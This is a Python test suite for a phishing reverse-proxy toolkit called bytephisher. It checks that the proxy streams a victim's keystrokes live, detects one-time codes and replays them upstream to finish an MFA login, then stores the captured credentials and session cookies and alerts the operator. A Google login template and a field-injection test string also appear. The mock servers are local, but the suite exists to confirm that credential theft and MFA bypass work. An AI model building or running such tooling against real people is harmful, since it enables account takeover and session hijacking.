"""Real-time relay: the live input stream and server-side OTP completion.

The claim under test is the one that matters: a streamed one-time code finishes
an MFA login UPSTREAM, inside the victim's session, without the victim pressing
submit - and the session is then reported as captured with a real cookie jar.

Run:  ./.venv/bin/python -m pytest tests/test_realtime.py -v
"""
import http.client
import http.server
import json
import os
import socketserver
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from conftest import HERE, free_port, repo_env

from core import capture as cap
from core import intel as intel_mod
from core import server as srv
from core.phishlet import AuthToken, CredentialField, Phishlet, ProxyHost
from core.proxy import ProxyEngine, serve_proxy

# tier marker: the Makefile and pyproject document `pytest -m integration` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.integration


TEMPLATES = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "templates")


# ============================================================ unit: parsing ==
class TestLiveParsing:
    def test_events_are_bounded(self):
        payload = {"events": [{"k": "input", "n": "user", "v": "x" * 900}] * 60}
        events, kind = intel_mod.normalise_live(payload)
        assert len(events) == 40                      # capped at 40 per beacon
        assert len(events[0]["v"]) == 300             # values capped at 300
        assert kind == "input"

    def test_malformed_input_yields_nothing(self):
        for bad in ({"events": "nope"}, {"events": [1, 2, 3]}, {}, {"events": None}):
            events, _ = intel_mod.normalise_live(bad)
            assert events == []

    def test_keystroke_and_metadata_survive(self):
        events, kind = intel_mod.normalise_live({
            "kind": "autofill",
            "events": [{"k": "key", "key": "Enter", "n": "pw", "ms": 1200},
                       {"k": "input", "n": "pw", "t": "password", "v": "s3cr3t", "len": 6, "sel": 6}]})
        assert kind == "autofill"
        assert events[0]["key"] == "Enter" and events[0]["ms"] == 1200
        assert events[1]["v"] == "s3cr3t" and events[1]["sel"] == 6


class TestOtpDetection:
    @pytest.mark.parametrize("name,value,expected", [
        ("otp", "123456", True),
        ("code", "4821", True),
        ("two_factor_code", "918273", True),
        ("verificationCode", "55221", True),
        ("pin", "1234", True),
        ("totp", "004281", True),
        ("q", "123456", True),            # a bare 6-digit value is treated as a code
        ("q", "12345", False),            # 5 digits in a search box is not
        ("email", "user@example.com", False),
        ("search", "invoice", False),
        ("otp", "", False),
        ("otp", "abcdef", False),
        ("otp", "1234567890", False),     # too long to be a one-time code
    ])
    def test_otp_shapes(self, name, value, expected):
        assert intel_mod.looks_like_otp(name, value) is expected


class TestLiveSummary:
    def test_latest_value_per_field_wins(self):
        events = [{"k": "input", "n": "user", "v": "su", "len": 2},
                  {"k": "input", "n": "user", "v": "suraj", "len": 5},
                  {"k": "input", "n": "otp", "v": "123456", "len": 6}]
        out = intel_mod.live_summary(events)
        fields = {f["name"]: f for f in out["fields"]}
        assert fields["user"]["value"] == "suraj" and fields["user"]["len"] == 5
        assert fields["otp"]["otp"] is True
        assert out["otp_seen"] == ["otp"]
        assert out["events"] == 3


# ================================================== integration: OTP relay ===
class OtpUpstream(http.server.BaseHTTPRequestHandler):
    """An MFA-protected site: password alone is not enough, the code is."""

    def log_message(self, *a):
        pass

    def _send(self, body, status=200, cookies=(), ctype="text/html"):
        raw = body.encode() if isinstance(body, str) else body
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        for c in cookies:
            self.send_header("Set-Cookie", c)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        self._send("<html><form action='/login' method='post'>"
                   "<input name='username'><input name='password' type='password'></form></html>",
                   cookies=["anon=1; Path=/; HttpOnly"])

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        form = {k: v[0] for k, v in urllib.parse.parse_qs(
            self.rfile.read(n).decode("utf-8", "replace")).items()}
        self.server.posts.append(form)
        if form.get("otp") == "123456":                 # the code we expect
            self._send("welcome", status=302,
                       cookies=["auth_token=TOK-OTP; Path=/; HttpOnly"])
            return
        if form.get("username") and form.get("password"):
            self._send("<html>enter the 6 digit code</html>", status=200)   # MFA step
            return
        self._send("bad", status=401)


class OtpUpstreamServer:
    def __enter__(self):
        self.port = free_port()
        self.httpd = socketserver.ThreadingTCPServer(("127.0.0.1", self.port), OtpUpstream)
        self.httpd.daemon_threads = True
        self.httpd.posts = []
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.2)
        return self

    def __exit__(self, *e):
        self.httpd.shutdown()
        self.httpd.server_close()
        return False


def mfa_phishlet(port):
    return Phishlet(
        name="mfa-site",
        proxy_hosts=[ProxyHost(domain="127.0.0.1", phish_sub="", orig_sub="", session=True,
                               is_landing=True, port=port, scheme="http")],
        sub_filters=[],
        js_inject=[],
        auth_tokens=[AuthToken(keys=["auth_token"], domain="127.0.0.1")],
        auth_urls=[],
        credentials={"username": CredentialField("username", "(.*)", "post"),
                     "password": CredentialField("password", "(.*)", "post")},
        capture_cookies=["*"], inject_paths=[".*"], verify_tls=False)


@pytest.fixture()
def db():
    d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_rt_"), "rt.db"))
    yield d
    d.close()


class TestOtpRelayThroughProxy:
    def test_streamed_code_completes_the_login_upstream(self, db):
        with OtpUpstreamServer() as up:
            engine = ProxyEngine(mfa_phishlet(up.port), db=db, geo_provider="off",
                                 logger=lambda *a: None)
            port = free_port()
            alerts = []
            engine.on_capture = alerts.append
            httpd = serve_proxy(engine, port, campaign="rt-test")
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            time.sleep(0.25)
            try:
                jar = {}
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
                conn.request("GET", "/", headers={"Host": "127.0.0.1"})
                r = conn.getresponse()
                r.read()
                for k, v in r.getheaders():
                    if k.lower() == "set-cookie":
                        jar[k and v.split("=")[0].strip()] = v.split("=")[1].split(";")[0]
                conn.close()
                sid = jar.get("__bhs")
                assert sid, f"the proxy must issue a session id, got {jar}"

                # step 1: the victim submits username+password (MFA site: no token yet)
                body = urllib.parse.urlencode({"username": "suraj", "password": "hunter2"})
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
                conn.request("POST", "/login", body=body, headers={
                    "Host": "127.0.0.1", "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": f"__bhs={sid}"})
                r = conn.getresponse()
                r.read()
                conn.close()
                sess = engine.sessions[sid]
                assert sess.vault["credentials"]["username"] == "suraj"
                assert sess.pending_login, "the credential POST must be remembered"
                assert not sess.session_complete, "an MFA site is not captured by the password"

                # step 2: the victim types the code - streamed live, never submitted
                live = json.dumps({"sid": sid, "kind": "input", "events": [
                    {"k": "input", "n": "otp", "t": "text", "v": "123456", "len": 6}]}).encode()
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
                conn.request("POST", intel_mod.LIVE_PATH, body=live, headers={
                    "Host": "127.0.0.1", "Content-Type": "application/json",
                    "Cookie": f"__bhs={sid}"})
                r = conn.getresponse()
                out = json.loads(r.read() or b"{}")
                conn.close()

                assert out.get("otp") is True
                assert out.get("auto", {}).get("ok") is True, out
                assert out["auto"]["captured"] is True, out
                # the upstream really received the code (not a claim, an observation)
                assert any(p.get("otp") == "123456" for p in up.httpd.posts), up.httpd.posts
                assert sess.session_complete
                assert sess.vault["cookies"], "the captured jar must be in the vault"
                kinds = [a.get("type") for a in alerts]
                assert "otp" in kinds and "session" in kinds, kinds
                otp_alert = next(a for a in alerts if a.get("type") == "otp")
                assert otp_alert["otp"][0]["value"] == "123456"
            finally:
                httpd.shutdown()

    def test_a_crafted_field_name_cannot_inject_form_fields(self, db):
        """complete_with_otp appended the streamed field name verbatim, so
        "otp&csrf=INJECTED&x" added two extra fields to the replayed login."""
        with OtpUpstreamServer() as up:
            engine = ProxyEngine(mfa_phishlet(up.port), db=db, geo_provider="off",
                                 logger=lambda *a: None)
            port = free_port()
            httpd = serve_proxy(engine, port, campaign="rt-test")
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            time.sleep(0.25)
            try:
                jar = {}
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
                conn.request("GET", "/", headers={"Host": "127.0.0.1"})
                r = conn.getresponse()
                r.read()
                for k, v in r.getheaders():
                    if k.lower() == "set-cookie":
                        jar[v.split("=")[0].strip()] = v.split("=")[1].split(";")[0]
                conn.close()
                sid = jar["__bhs"]
                body = urllib.parse.urlencode({"username": "u", "password": "p"})
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
                conn.request("POST", "/login", body=body, headers={
                    "Host": "127.0.0.1", "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": f"__bhs={sid}"})
                r = conn.getresponse()
                r.read()
                conn.close()

                live = json.dumps({"sid": sid, "events": [
                    {"k": "input", "n": "otp&csrf=INJECTED&x", "v": "123456", "len": 6}
                ]}).encode()
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
                conn.request("POST", intel_mod.LIVE_PATH, body=live, headers={
                    "Host": "127.0.0.1", "Content-Type": "application/json",
                    "Cookie": f"__bhs={sid}"})
                conn.getresponse().read()
                conn.close()
                posted = up.httpd.posts[-1]
                assert "csrf" not in posted, f"an injected field reached the upstream: {posted}"
                assert "x" not in posted
                assert "123456" in posted.values(), posted
            finally:
                httpd.shutdown()

    def test_a_wrong_code_does_not_capture(self, db):
        with OtpUpstreamServer() as up:
            engine = ProxyEngine(mfa_phishlet(up.port), db=db, geo_provider="off",
                                 logger=lambda *a: None)
            port = free_port()
            httpd = serve_proxy(engine, port, campaign="rt-test")
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            time.sleep(0.25)
            try:
                jar = {}
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
                conn.request("GET", "/", headers={"Host": "127.0.0.1"})
                r = conn.getresponse()
                r.read()
                for k, v in r.getheaders():
                    if k.lower() == "set-cookie":
                        jar[v.split("=")[0].strip()] = v.split("=")[1].split(";")[0]
                conn.close()
                sid = jar["__bhs"]
                body = urllib.parse.urlencode({"username": "u", "password": "p"})
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
                conn.request("POST", "/login", body=body, headers={
                    "Host": "127.0.0.1", "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": f"__bhs={sid}"})
                r = conn.getresponse()
                r.read()
                conn.close()

                live = json.dumps({"sid": sid, "events": [
                    {"k": "input", "n": "otp", "v": "000000", "len": 6}]}).encode()
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
                conn.request("POST", intel_mod.LIVE_PATH, body=live, headers={
                    "Host": "127.0.0.1", "Content-Type": "application/json",
                    "Cookie": f"__bhs={sid}"})
                out = json.loads(conn.getresponse().read() or b"{}")
                conn.close()
                assert out["auto"]["ok"] is True
                assert out["auto"]["captured"] is False, "a rejected code must not look captured"
                assert not engine.sessions[sid].session_complete
            finally:
                httpd.shutdown()


# ============================================== integration: static server ===
class StaticServer:
    def __init__(self, notifier=None):
        self.db_path = os.path.join(tempfile.mkdtemp(prefix="bh_rt_srv_"), "s.db")
        self.port = free_port()
        self.httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), self.port,
                                  self.db_path, geo_provider="off", on_capture=notifier,
                                  site_name="google")
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        self.db = cap.CaptureDB(self.db_path)
        time.sleep(0.25)

    def post(self, path, payload, raw=None):
        body = raw if raw is not None else json.dumps(payload).encode()
        req = urllib.request.Request(f"http://127.0.0.1:{self.port}{path}", data=body,
                                     headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status, json.loads(r.read() or b"{}")
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read() or b"{}")

    def stop(self):
        self.httpd.shutdown()


class TestLiveRouteOnStaticServer:
    def test_events_are_stored_and_alerted(self):
        alerts = []
        s = StaticServer(notifier=alerts.append)
        try:
            status, out = s.post(intel_mod.LIVE_PATH, {
                "sid": "a" * 32, "kind": "input",
                "events": [{"k": "input", "n": "user", "v": "suraj", "len": 5}]})
            assert status == 200 and out["stored"] == 1
            rows = s.db.live_for("a" * 32)
            assert rows and rows[-1]["events"][0]["v"] == "suraj"
            assert alerts[-1]["type"] == "live"
        finally:
            s.stop()

    def test_an_otp_event_alerts_as_otp(self):
        alerts = []
        s = StaticServer(notifier=alerts.append)
        try:
            status, out = s.post(intel_mod.LIVE_PATH, {
                "sid": "b" * 32,
                "events": [{"k": "input", "n": "otp", "v": "123456", "len": 6}]})
            assert status == 200 and out["otp"] is True
            assert alerts[-1]["type"] == "otp"
            assert alerts[-1]["otp"][0]["value"] == "123456"
        finally:
            s.stop()

    def test_malformed_and_empty_bodies_are_rejected(self):
        s = StaticServer()
        try:
            assert s.post(intel_mod.LIVE_PATH, None, raw=b"not json")[0] == 400
            assert s.post(intel_mod.LIVE_PATH, {"events": []})[1]["stored"] == 0
            assert s.post(intel_mod.LIVE_PATH, {"events": [1, 2]})[1]["stored"] == 0
        finally:
            s.stop()

    def test_oversized_body_is_refused(self):
        """A 3MB beacon must be refused, and nothing may be stored.

        The server answers 413 before reading the body, so the client can see a
        broken pipe while it is still sending: the assertion is that the request
        was refused and left no row behind, not that the socket was pretty.
        """
        s = StaticServer()
        try:
            try:
                status, _ = s.post(intel_mod.LIVE_PATH, None, raw=b"x" * (3 * 1024 * 1024))
                assert status == 413
            except urllib.error.URLError:
                pass                       # refused mid-upload: also a refusal
            assert s.db.live_for("x" * 32) == []
            assert s.db.live_for("") == []
        finally:
            s.stop()


class TestCliSessionShowsTheStream:
    """`--session` is the operator's primary view: the live stream belongs there,
    not only in the Telegram chat."""

    def _home_with_db(self, tmp_path, rows, sid):
        """A throwaway BYTEPHISHER_HOME holding the capture DB the CLI reads."""
        home = os.path.join(str(tmp_path), "bhhome")
        os.makedirs(os.path.join(home, "data"), exist_ok=True)
        db = cap.CaptureDB(os.path.join(home, "data", "bytephisher.db"))
        from core import session as sess_mod
        db.session_save(sess_mod.new_record(sid, campaign="cli-live"))
        for ev in rows:
            db.live_add(sid, "input", [ev])
        db.close()
        return home

    def test_the_session_view_prints_the_live_fields(self, tmp_path):
        sid = "c" * 32
        home = self._home_with_db(tmp_path, [
            {"k": "input", "n": "username", "v": "suraj", "t": "text"},
            {"k": "input", "n": "otp", "v": "123456", "t": "text"},
        ], sid)
        p = subprocess.run([sys.executable, os.path.join(HERE, "bytephisher.py"), "--session", sid],
                           capture_output=True, text=True, timeout=180, cwd=HERE,
                           env=dict(repo_env(), BYTEPHISHER_HOME=home))
        out = p.stdout
        assert p.returncode == 0, out + p.stderr
        assert "live input" in out, out
        assert "username" in out and "suraj" in out
        assert "one-time code" in out

    def test_purge_flag_removes_the_stream(self, tmp_path):
        sid = "d" * 32
        home = self._home_with_db(
            tmp_path, [{"k": "input", "n": "a", "v": "1"}], sid)
        env = dict(repo_env(), BYTEPHISHER_HOME=home)
        p = subprocess.run([sys.executable, os.path.join(HERE, "bytephisher.py"), "--live-purge", sid],
                           capture_output=True, text=True, timeout=180, cwd=HERE, env=env)
        assert p.returncode == 0, p.stdout + p.stderr
        assert "purged 1" in p.stdout, p.stdout
        db = cap.CaptureDB(os.path.join(home, "data", "bytephisher.db"))
        assert db.live_count(sid) == 0
        db.close()

    def test_keep_days_prunes_on_start(self, tmp_path):
        sid = "e" * 32
        home = self._home_with_db(
            tmp_path, [{"k": "input", "n": "old", "v": "1"}], sid)
        # age the row, then ask the CLI to prune it on start
        db = cap.CaptureDB(os.path.join(home, "data", "bytephisher.db"))
        db._conn().execute("UPDATE live_input SET ts=ts-900000")
        db._conn().commit()
        db.close()
        p = subprocess.run([sys.executable, os.path.join(HERE, "bytephisher.py"), "--keep-days", "1",
                            "--sessions"],
                           capture_output=True, text=True, timeout=180, cwd=HERE,
                           env=dict(repo_env(), BYTEPHISHER_HOME=home))
        assert p.returncode == 0, p.stdout + p.stderr
        assert "retention" in p.stdout and "dropped 1" in p.stdout, p.stdout
        db = cap.CaptureDB(os.path.join(home, "data", "bytephisher.db"))
        assert db.live_count() == 0
        db.close()


class TestLiveStorage:
    def test_stream_is_capped_but_keeps_the_tail(self, db):
        for i in range(300):
            db.live_add("c" * 32, "input", [{"k": "input", "n": "f", "v": str(i)}])
        rows = db.live_for("c" * 32, limit=50)
        assert len(rows) == 50
        assert rows[-1]["events"][0]["v"] == "299"        # newest last
        assert rows[0]["events"][0]["v"] == "250"

    def test_prune_by_age_keeps_the_recent_rows(self, db):
        now = time.time()
        db.live_add("f" * 32, "input", [{"k": "input", "n": "old", "v": "1"}],
                    ts=now - 5 * 86400)
        db.live_add("f" * 32, "input", [{"k": "input", "n": "new", "v": "2"}], ts=now)
        assert db.live_count() == 2
        removed = db.prune_live(keep_days=1)
        assert removed == 1
        rows = db.live_for("f" * 32)
        assert len(rows) == 1 and rows[0]["events"][0]["n"] == "new"

    def test_prune_by_rows_keeps_the_tail(self, db):
        for i in range(30):
            db.live_add("g" * 32, "input", [{"k": "input", "n": "f", "v": str(i)}])
        assert db.prune_live(keep_rows=10) == 20
        rows = db.live_for("g" * 32, limit=100)
        assert len(rows) == 10
        assert rows[-1]["events"][0]["v"] == "29"

    def test_purge_removes_one_session_only(self, db):
        db.live_add("h" * 32, "input", [{"k": "input", "n": "a", "v": "1"}])
        db.live_add("i" * 32, "input", [{"k": "input", "n": "b", "v": "2"}])
        assert db.live_purge("h" * 32) == 1
        assert db.live_count("h" * 32) == 0
        assert db.live_count("i" * 32) == 1
        assert db.live_purge("h" * 32) == 0        # idempotent

    def test_prune_with_no_arguments_removes_nothing(self, db):
        db.live_add("j" * 32, "input", [{"k": "input", "n": "a", "v": "1"}])
        assert db.prune_live() == 0
        assert db.live_count() == 1

    def test_streams_are_per_session(self, db):
        db.live_add("d" * 32, "input", [{"k": "input", "n": "a", "v": "1"}])
        db.live_add("e" * 32, "input", [{"k": "input", "n": "b", "v": "2"}])
        assert db.live_for("d" * 32)[-1]["events"][0]["v"] == "1"
        assert db.live_for("e" * 32)[-1]["events"][0]["v"] == "2"
